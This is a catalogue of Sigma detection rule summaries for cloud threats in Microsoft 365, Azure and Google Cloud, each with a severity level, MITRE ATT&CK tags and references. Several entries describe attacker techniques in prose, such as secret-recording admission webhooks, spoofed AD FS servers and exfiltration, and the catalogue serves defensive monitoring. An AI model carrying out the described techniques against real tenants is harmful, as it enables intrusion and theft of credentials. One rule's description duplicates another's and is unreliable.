### Microsoft 365 - Impossible Travel Activity
    
    Detects when a Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_impossible_travel_activity.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Activity Performed by Terminated User
    
    Detects when a Microsoft Cloud App Security reported for users whose account were terminated in Azure AD, but still perform activities in other platforms such as AWS or Salesforce. This is especially relevant for users who use another account to manage resources, since these accounts are often not terminated when a user leaves the company.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_activity_by_terminated_user.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Logon from a Risky IP Address
    
    Detects when a Microsoft Cloud App Security reported when a user signs into your sanctioned apps from a risky IP address.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_logon_from_risky_ip_address.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Microsoft 365 - User Restricted from Sending Email
    
    Detects when a Security Compliance Center reported a user who exceeded sending limits of the service policies and because of this has been restricted from sending email.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1199
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_user_restricted_from_sending_email.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Suspicious OAuth App File Download Activities
    
    Detects when a Microsoft Cloud App Security reported when an app downloads multiple files from Microsoft SharePoint or Microsoft OneDrive in a manner that is unusual for the user.

    * Level: medium
    * MITRE: attack.exfiltration
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_susp_oauth_app_file_download_activities.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Activity from Anonymous IP Addresses
    
    Detects when a Microsoft Cloud App Security reported when users were active from an IP address that has been identified as an anonymous proxy IP address.

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1573
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_activity_from_anonymous_ip_addresses.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Data Exfiltration to Unsanctioned Apps
    
    Detects when a Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization.

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1537
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_data_exfiltration_to_unsanctioned_app.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Microsoft 365 - Potential Ransomware Activity
    
    Detects when a Microsoft Cloud App Security reported when a user uploads files to the cloud that might be infected with ransomware.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_potential_ransomware_activity.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### New Federated Domain Added
    
    Alert for the addition of a new federated domain.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1136.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_new_federated_domain_added.yml
* https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf

* https://us-cert.cisa.gov/ncas/alerts/aa21-008a

* https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html

* https://www.sygnia.co/golden-saml-advisory

* https://o365blog.com/post/aadbackdoor/

    
### Microsoft 365 - Unusual Volume of File Deletion
    
    Detects when a Microsoft Cloud App Security reported a user has deleted a unusual a large volume of files.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_unusual_volume_of_file_deletion.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Activity from Infrequent Country
    
    Detects when a Microsoft Cloud App Security reported when an activity occurs from a location that wasn't recently or never visited by any user in the organization.

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1573
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/m365/microsoft365_activity_from_infrequent_country.yml
* https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy

* https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference

    
### Azure Suppression Rule Created
    
    Identifies when a suppression rule is created in Azure. Adversary's could attempt this to evade detection.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_suppression_rule_created.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Multifactor Authentication Denied
    
    User has indicated they haven't instigated the MFA prompt and could indicate an attacker has the password for the account.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_mfa_denies.yml
* https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/

    
### Azure Application Gateway Modified or Deleted
    
    Identifies when a application gateway is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_application_gateway_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure New CloudShell Created
    
    Identifies when a new cloudshell is created inside of Azure portal.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_new_cloudshell_created.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Owner Removed From Application or Service Principal
    
    Identifies when a owner is was removed from a application or service principal in Azure.

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_owner_removed_from_application_or_service_principal.yml
* https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy

    
### Azure VPN Connection Modified or Deleted
    
    Identifies when a VPN connection is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_vpn_connection_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Network Security Configuration Modified or Deleted
    
    Identifies when a network security configuration is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_network_security_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure DNS Zone Modified or Deleted
    
    Identifies when DNS zone is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_dns_zone_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

    
### Azure Application Credential Modified
    
    Identifies when a application credential is modified.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_app_credential_modification.yml
* https://www.cloud-architekt.net/auditing-of-msi-and-service-principals/

    
### Azure Point-to-site VPN Modified or Deleted
    
    Identifies when a Point-to-site VPN is Modified or Deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_network_p2s_vpn_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Active Directory Hybrid Health AD FS Service Delete
    
    This detection uses azureactivity logs (Administrative category) to identify the deletion of an Azure AD Hybrid health AD FS service instance in a tenant.
A threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs.
The health AD FS service can then be deleted after it is not longer needed via HTTP requests to Azure.


    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1578.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_aadhybridhealth_adfs_service_delete.yml
* https://o365blog.com/post/hybridhealthagent/

    
### Azure Firewall Rule Configuration Modified or Deleted
    
    Identifies when a Firewall Rule Configuration is Modified or Deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_network_firewall_rule_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Virtual Network Modified or Deleted
    
    Identifies when a Virtual Network is modified or deleted in Azure.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_virtual_network_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Kubernetes CronJob
    
    Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_cronjob.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/

* https://kubernetes.io/docs/concepts/workloads/controllers/job/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

    
### Azure Subscription Permission Elevation Via ActivityLogs
    
    Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn't planned. This setting could allow an attacker access to Azure subscriptions in your environment.

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_subscription_permissions_elevation_via_activitylogs.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftauthorization

    
### Azure Subscription Permission Elevation Via AuditLogs
    
    Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn't planned. This setting could allow an attacker access to Azure subscriptions in your environment.

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_subscription_permissions_elevation_via_auditlogs.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts#assignment-and-elevation

    
### Azure Unusual Authentication Interruption
    
    Detects when there is a interruption in the authentication process.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_unusual_authentication_interruption.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts

    
### Azure Firewall Modified or Deleted
    
    Identifies when a firewall is created, modified, or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_firewall_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Network Firewall Policy Modified or Deleted
    
    Identifies when a Firewall Policy is Modified or Deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_network_firewall_policy_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Virtual Network Device Modified or Deleted
    
    Identifies when a virtual network device is being modified or deleted. This can be a network interface, network virtual appliance, virtual hub, or virtual router.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_network_virtual_device_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Change to Authentication Method
    
    Change to authentication method could be an indicated of an attacker adding an auth method to the account so they can have continued access.

    * Level: medium
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_change_to_authentication_method.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts

    
### Azure Domain Federation Settings Modified
    
    Identifies when an user or application modified the federation settings on the domain.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_federation_modified.yml
* https://attack.mitre.org/techniques/T1078

    
### Azure Kubernetes Service Account Modified or Deleted
    
    Identifies when a service account is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_service_account_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### Azure Kubernetes Network Policy Change
    
    Identifies when a Azure Kubernetes network policy is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_network_policy_change.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### Azure Service Principal Removed
    
    Identifies when a service principal was removed in Azure.

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_service_principal_removed.yml
* https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy

    
### Azure Kubernetes Admission Controller
    
    Identifies when an admission controller is executed in Azure Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1078
    * MITRE: attack.credential_access
    * MITRE: attack.t1552
    * MITRE: attack.t1552.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_admission_controller.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

    
### Azure Kubernetes Cluster Created or Deleted
    
    Detects when a Azure Kubernetes Cluster is created or deleted.

    * Level: low
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_cluster_created_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### User Access Blocked by Azure Conditional Access
    
    Detect access has been blocked by Conditional Access policies. The access policy does not allow token issuance which might be sights≈ of unauthorizeed login to valid accounts.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1110
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_user_login_blocked_by_conditional_access.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts

    
### Disabled MFA to Bypass Authentication Mechanisms
    
    Detection for when multi factor authentication has been disabled, which might indicate a malicious activity to bypass authentication mechanisms.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1556
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_mfa_disabled.yml
* https://attack.mitre.org/techniques/T1556/

* https://docs.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-userstates

    
### Azure Kubernetes RoleBinding/ClusterRoleBinding Modified and Deleted
    
    Detects the creation or patching of potential malicious RoleBinding/ClusterRoleBinding.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_rolebinding_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### Azure Container Registry Created or Deleted
    
    Detects when a Container Registry is created or deleted.

    * Level: low
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_container_registry_created_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### Azure Kubernetes Secret or Config Object Access
    
    Identifies when a Kubernetes account access a sensitive objects such as configmaps or secrets.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_secret_or_config_object_access.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### Azure Device No Longer Managed or Compliant
    
    Identifies when a device in azure is no longer managed or compliant

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_device_no_longer_managed_or_compliant.yml
* https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#core-directory

    
### Granting Of Permissions To An Account
    
    Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used.

    * Level: medium
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_granting_permission_detection.yml
* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/azureactivity/Granting_Permissions_To_Account_detection.yaml

    
### Azure Kubernetes Events Deleted
    
    Detects when Events are deleted in Azure Kubernetes. An adversary may delete events in Azure Kubernetes in an attempt to evade detection.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_events_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://github.com/elastic/detection-rules/blob/da3852b681cf1a33898b1535892eab1f3a76177a/rules/integrations/azure/defense_evasion_kubernetes_events_deleted.toml

    
### Multifactor Authentication Interupted
    
    Identifies user login with multifactor authentication failures, which might be an indication an attacker has the password for the account but can't pass the MFA challenge.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_mfa_interrupted.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts

    
### Azure Keyvault Secrets Modified or Deleted
    
    Identifies when secrets are modified or deleted in Azure.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.credential_access
    * MITRE: attack.t1552
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_keyvault_secrets_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Application Deleted
    
    Identifies when a application is deleted in Azure.

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_application_deleted.yml
* https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy

    
### Azure Key Vault Modified or Deleted
    
    Identifies when a key vault is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.credential_access
    * MITRE: attack.t1552
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_keyvault_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Device or Configuration Modified or Deleted
    
    Identifies when a device or device configuration in azure is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_device_or_configuration_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#core-directory

    
### Azure Firewall Rule Collection Modified or Deleted
    
    Identifies when Rule Collections (Application, NAT, and Network) is being modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_firewall_rule_collection_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### User Added to an Administrator's Azure AD Role
    
    User Added to an Administrator's Azure AD Role

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1098.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_ad_user_added_to_admin_role.yml
* https://attack.mitre.org/techniques/T1098/003/

* https://m365internals.com/2021/07/13/what-ive-learned-from-doing-a-year-of-cloud-forensics-in-azure-ad/

    
### Azure Application Security Group Modified or Deleted
    
    Identifies when a application security group is modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_application_security_group_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Kubernetes Pods Deleted
    
    Identifies the deletion of Azure Kubernetes Pods.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_pods_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://github.com/elastic/detection-rules/blob/065bf48a9987cd8bd826c098a30ce36e6868ee46/rules/integrations/azure/impact_kubernetes_pod_deleted.toml

    
### Azure Kubernetes Sensitive Role Access
    
    Identifies when ClusterRoles/Roles are being modified or deleted.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_kubernetes_role_access.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes

* https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/

* https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

* https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1

* https://attack.mitre.org/matrices/enterprise/cloud/

    
### Azure Service Principal Created
    
    Identifies when a service principal is created in Azure.

    * Level: medium
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_service_principal_created.yml
* https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy

    
### Azure Keyvault Key Modified or Deleted
    
    Identifies when a Keyvault Key is modified or deleted in Azure.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.credential_access
    * MITRE: attack.t1552
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_keyvault_key_modified_or_deleted.yml
* https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations

    
### Azure Active Directory Hybrid Health AD FS New Server
    
    This detection uses azureactivity logs (Administrative category) to identify the creation or update of a server instance in an Azure AD Hybrid health AD FS service.
A threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-prem AD FS server.
This can be done programmatically via HTTP requests to Azure.


    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1578
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_aadhybridhealth_adfs_new_server.yml
* https://o365blog.com/post/hybridhealthagent/

    
### Account Lockout
    
    Identifies user account which has been locked because the user tried to sign in too many times with an incorrect user ID or password.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1110
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_account_lockout.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts

    
### Number Of Resource Creation Or Deployment Activities
    
    Number of VM creations or deployment activities occur in Azure via the azureactivity log.

    * Level: medium
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_creating_number_of_resources_detection.yml
* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/azureactivity/Creating_Anomalous_Number_Of_Resources_detection.yaml

    
### Login to Disabled Account
    
    Detect failed attempts to sign in to disabled accounts.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_login_to_disabled_account.yml
* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts

    
### Rare Subscription-level Operations In Azure
    
    Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used.

    * Level: medium
    * MITRE: attack.t1003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/azure/azure_rare_operations.yml
* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/azureactivity/RareOperations.yaml

    
### Google Cloud Firewall Modified or Deleted
    
    Detects  when a firewall rule is modified or deleted in Google Cloud Platform (GCP).

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_firewall_rule_modified_or_deleted.yml
* https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging

* https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/com/google/api/services/compute/Compute.Firewalls.html

    
### Google Cloud Re-identifies Sensitive Information
    
    Identifies when sensitive information is re-identified in google Cloud.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1565
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_dlp_re_identifies_sensitive_information.yml
* https://cloud.google.com/dlp/docs/reference/rest/v2/projects.content/reidentify

    
### Google Cloud DNS Zone Modified or Deleted
    
    Identifies when a DNS Zone is modified or deleted in Google Cloud.

    * Level: medium
    * MITRE: attack.impact
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/cloud/gcp/gcp_dns_zone_modified_or_deleted.yml
